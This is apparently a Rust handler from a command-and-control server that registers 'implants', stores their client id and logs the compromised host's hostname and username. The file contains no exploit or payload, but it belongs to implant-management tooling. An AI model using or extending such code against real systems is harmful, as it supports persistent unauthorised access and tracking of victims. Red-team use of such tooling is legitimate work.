use std::{
    future::Future,
    io::{Error, ErrorKind},
    pin::Pin,
    str::FromStr,
    sync::Arc,
};

use hyper::StatusCode;
use serde_json::json;
use uuid::Uuid;

use crate::util::{
    activity::ActivitySeverity, app::ServerContext, implants::RegisterPayload, packet::Packet,
    router::PacketReply,
};

pub fn handle(
    context: Arc<ServerContext>,
    packet: Packet,
) -> Pin<Box<dyn Future<Output = PacketReply> + Send>> {
    Box::pin(async move {
        match packet.parse_data::<RegisterPayload>() {
            Ok(payload) => match parse_clientid(packet.clientid()) {
                Ok(clientid) => {
                    let record = context
                        .implants()
                        .upsert_registration(clientid, payload)
                        .await;
                    context
                        .record_activity(
                            ActivitySeverity::Success,
                            format!(
                                "registered {} on {}\\{}",
                                record.identity.clientid,
                                record.static_metadata.hostname,
                                record.static_metadata.username
                            ),
                            Some(record.identity.clientid),
                            None,
                        )
                        .await;
                    PacketReply::packet(
                        StatusCode::OK,
                        packet.opcode_kind(),
                        packet.clientid(),
                        &json!({
                            "status": "ok",
                            "clientid": record.identity.clientid,
                        }),
                    )
                }
                Err(err) => error_reply(&packet, StatusCode::BAD_REQUEST, &err.to_string()),
            },
            Err(err) => error_reply(&packet, StatusCode::BAD_REQUEST, &err.to_string()),
        }
    })
}

fn parse_clientid(clientid: &str) -> Result<Uuid, Error> {
    Uuid::from_str(clientid).map_err(|e| Error::new(ErrorKind::InvalidInput, e.to_string()))
}

fn error_reply(packet: &Packet, status: StatusCode, message: &str) -> PacketReply {
    PacketReply::packet(
        status,
        packet.opcode_kind(),
        packet.clientid(),
        &json!({
            "status": "error",
            "message": message,
        }),
    )
}
